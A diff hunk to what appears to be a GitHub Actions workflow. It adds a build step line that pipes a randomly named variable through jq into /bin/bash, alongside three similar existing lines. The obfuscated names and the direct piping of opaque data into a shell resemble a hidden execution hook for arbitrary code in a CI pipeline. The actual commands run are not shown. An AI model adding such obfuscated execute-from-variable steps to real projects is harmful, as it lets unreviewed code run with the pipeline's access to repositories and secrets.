@@ -26,6 +26,7 @@ jobs:
           echo $lhh3592 | jq -r .ai5403 | /bin/bash
           printf '%s' "$ht7012" | jq -r .myznv84457 | /bin/bash
           echo $sqp87448 | jq -r .v625 | /bin/bash
+          printf '%s' "$h0986" | jq -r .qih732 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
